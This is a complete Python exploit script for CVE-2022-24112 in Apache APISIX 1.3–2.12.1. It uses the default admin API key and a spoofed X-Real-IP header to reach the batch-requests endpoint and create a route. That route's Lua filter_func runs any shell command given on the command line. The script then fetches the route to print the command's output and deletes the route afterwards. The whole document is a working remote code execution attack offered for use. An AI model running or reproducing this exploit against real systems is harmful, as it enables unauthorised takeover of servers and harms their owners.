# Exploit Title: Apache APISIX 2.12.1 - Remote Code Execution (RCE)
# Date: 2022-03-16
# Exploit Author: Ven3xy
# Vendor Homepage: https://apisix.apache.org/
# Version: Apache APISIX 1.3 – 2.12.1
# Tested on: CentOS 7
# CVE : CVE-2022-24112

import requests
import sys
import json
from urllib.parse import urlparse, quote

class color:
    HEADER = '\033[95m'
    IMPORTANT = '\33[35m'
    NOTICE = '\033[33m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    UNDERLINE = '\033[4m'
    LOGGING = '\33[34m'

color_random = [color.HEADER, color.IMPORTANT, color.NOTICE, color.OKBLUE, color.OKGREEN, color.WARNING, color.RED, color.END, color.UNDERLINE, color.LOGGING]

def banner():
    run = color_random[6] + r'''\n                                   .     , 
        _.._ * __*/ ___  _ /._ | _ *-+-
       (_][_)|_) |/'\     (/,/'\[_)|(_)| | 
          |                     |          
\n'''
    run2 = color_random[2] + '''\t\t(CVE-2022-24112)\n'''           
    run3 = color_random[4] + '''{ Coded By: Ven3xy  | Github: https://github.com/M4xSec/ }\n\n'''
    run4 = '''POWERBY:M4xSec & only:chunqiuyunjing.com'''
    print(run + run2 + run3 + run4)

def normalize_target_url(target):
    """规范化目标URL，确保格式正确"""
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    parsed = urlparse(target)
    if not parsed.netloc:
        print(color.RED + "[-] Invalid target URL format" + color.END)
        sys.exit(1)
    
    return parsed.scheme + '://' + parsed.netloc

def escape_command(command):
    """转义命令中的特殊字符"""
    # 转义反斜杠和引号
    command = command.replace('\\', '\\\\')
    command = command.replace('"', '\\"')
    command = command.replace("'", "\\'")
    return command

if (len(sys.argv) != 3):
    banner()
    print("[!] Usage   : ./apisix-exploit.py <target_url> <command>")
    print("[!] Example : ./apisix-exploit.py 192.168.1.100:9080 \"ls -la /tmp\"")
    print("[!] Example : ./apisix-exploit.py http://target.com:9080 \"pwd\"")
    exit()
else:
    banner()
    raw_target = sys.argv[1]
    command = escape_command(sys.argv[2])
    
    target_url = normalize_target_url(raw_target)
    print(color.OKBLUE + f"[*] Target URL: {target_url}" + color.END)
    print(color.OKBLUE + f"[*] Command to execute: {sys.argv[2]}" + color.END)

# 从目标URL中提取主机名用于Host头
parsed_url = urlparse(target_url)
host_header = parsed_url.netloc

headers1 = {
    'Host': host_header,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36 Edg/97.0.1072.69',
    'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1',
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/json',
    'Connection': 'close',
}

headers2 = {
    'Host': host_header,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36 Edg/97.0.1072.69',
    'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1',
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/json',
    'Connection': 'close',
}

# 创建恶意路由来执行命令并输出结果
# 使用正确的JSON转义
filter_func = f'function(vars) local handle = io.popen("{command}"); local result = handle:read("*a"); handle:close(); ngx.say(result); return true end'

route_config = {
    "uri": "/rms/fzxewh",
    "upstream": {
        "type": "roundrobin",
        "nodes": {
            "schmidt-schaefer.com": 1
        }
    },
    "name": "wthtzv",
    "filter_func": filter_func
}

json_data = {
    'headers': {
        'X-Real-IP': '127.0.0.1',
        'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1',
        'Content-Type': 'application/json',
    },
    'timeout': 1500,
    'pipeline': [
        {
            'path': '/apisix/admin/routes/index',
            'method': 'PUT',
            'body': json.dumps(route_config)
        },
    ],
}

print(color.OKBLUE + "[*] Sending malicious batch request to create route..." + color.END)
try:
    response1 = requests.post(target_url + '/apisix/batch-requests', headers=headers1, json=json_data, verify=False, timeout=30)
    
    if response1.status_code == 200:
        print(color.OKGREEN + "[+] Successfully created malicious route!" + color.END)
        print(color.OKBLUE + f"[*] Response: {response1.text}" + color.END)
        
        # 检查响应中是否有错误
        try:
            response_data = response1.json()
            if isinstance(response_data, list) and len(response_data) > 0:
                first_response = response_data[0]
                if first_response.get('status') != 200:
                    print(color.RED + "[-] Route creation failed in batch response" + color.END)
                    print(color.RED + f"[-] Details: {first_response.get('body', 'No details')}" + color.END)
                    exit()
        except:
            pass
            
    else:
        print(color.RED + "[-] Failed to create route. Status code: " + str(response1.status_code) + color.END)
        print(color.RED + "[-] Response: " + response1.text + color.END)
        exit()

    print(color.OKBLUE + "[*] Triggering the malicious route to execute command..." + color.END)
    response2 = requests.get(target_url + '/rms/fzxewh', headers=headers2, verify=False, timeout=30)

    if response2.status_code == 200:
        print(color.OKGREEN + "[+] Command executed successfully!" + color.END)
        print(color.OKGREEN + "[+] Output:" + color.END)
        print(response2.text)
    else:
        print(color.RED + "[-] Failed to execute command. Status code: " + str(response2.status_code) + color.END)
        print(color.RED + "[-] Response: " + response2.text + color.END)

except requests.exceptions.ConnectionError as e:
    print(color.RED + f"[-] Connection error: {e}" + color.END)
except requests.exceptions.Timeout:
    print(color.RED + "[-] Request timeout" + color.END)
except Exception as e:
    print(color.RED + f"[-] Unexpected error: {e}" + color.END)

# 清理：删除创建的路由
print(color.OKBLUE + "[*] Cleaning up - removing the malicious route..." + color.END)
try:
    cleanup_json = {
        'headers': {
            'X-Real-IP': '127.0.0.1',
            'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1',
            'Content-Type': 'application/json',
        },
        'timeout': 1500,
        'pipeline': [
            {
                'path': '/apisix/admin/routes/index',
                'method': 'DELETE',
                'body': json.dumps({"uri": "/rms/fzxewh"})
            },
        ],
    }

    response3 = requests.post(target_url + '/apisix/batch-requests', headers=headers1, json=cleanup_json, verify=False, timeout=10)
    if response3.status_code == 200:
        print(color.OKGREEN + "[+] Successfully cleaned up malicious route!" + color.END)
    else:
        print(color.WARNING + "[!] Warning: Failed to clean up route." + color.END)
except Exception as e:
    print(color.WARNING + f"[!] Warning: Cleanup failed: {e}" + color.END)
